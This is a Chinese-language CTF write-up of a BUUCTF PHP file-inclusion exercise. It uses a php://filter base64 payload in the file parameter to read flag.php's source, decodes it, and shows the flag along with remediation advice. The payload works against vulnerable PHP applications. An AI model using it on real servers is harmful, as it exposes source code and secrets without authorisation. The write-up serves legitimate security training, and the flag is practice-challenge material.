# CTF 练习：[ACTF2020 新生赛]Include（php://filter 读源码）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，6400 人解出）
> 环境：Kali Linux + 浏览器
> 日期：2026-11-19
> 性质：平台提供的授权靶场

---

## 一、目标

页面存在文件包含参数 `?file=`，通过 `php://filter` 把 `flag.php` 当数据读出来，绕过「源码被执行」的问题。

## 二、侦察

首页只有一个 `tips` 链接。访问：

```
http://靶机/?file=tips
```

再试：

```
http://靶机/?file=flag.php
```

页面只显示：

```
Can you find out the flag?
```

说明 `flag.php` **被 include 执行了**，PHP 代码本身看不到。

## 三、利用 php://filter

把 `file` 参数换成 filter 包装器：

```
http://靶机/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

返回：

```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL0NURjJ7ZGY1ZDJlYmItYjVjMy00ZjI4LThmNTItMjg4OTY2NGFiNTMxfQo=
```

## 四、解码

```bash
echo "PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL0NURjJ7ZGY1ZDJlYmItYjVjMy00ZjI4LThmNTItMjg4OTY2NGFiNTMxfQo=" | base64 -d
```

得到：

```php
<?php
echo "Can you find out the flag?";
//CTF2{df5d2ebb-b5c3-4f28-8f52-2889664ab531}
```

**flag 藏在注释里。**

## 五、原理

| 点 | 说明 |
|---|---|
| 文件包含 | `include $_GET['file']` 直接包含用户输入 |
| 执行 vs 读取 | `include 'flag.php'` 会**执行** PHP，源码不可见 |
| `php://filter` | 用流过滤器包裹文件，把内容**当数据**读出（这里是 base64） |
| `convert.base64-encode` | 把文件内容 base64 编码，避免二进制/特殊字符问题 |

## 六、修复

| 措施 | 说明 |
|---|---|
| 禁止动态包含 | 用固定映射：`['tips' => 'tips.php']` |
| 白名单 + 规范化 | `realpath()` 校验路径在允许目录内 |
| 关闭危险包装器 | `allow_url_include=Off`，必要时限制 `php://` |
| 最小权限 | Web 目录外不放敏感文件 |

## 七、踩坑

- `?file=flag.php` 只看到 `Can you find out the flag?`，**不是失败，是执行结果**。
- 必须用 `php://filter` 才能读源码。
- Base64 解码时别漏末尾 `=` 号。

## 八、收获

- 记住 `php://filter/read=convert.base64-encode/resource=xxx` 这个万能钥匙。
- 理解了「包含执行」和「读取源码」是两件事。
- 文件包含题的固定套路：先包含 → 看不到 → 上 filter。
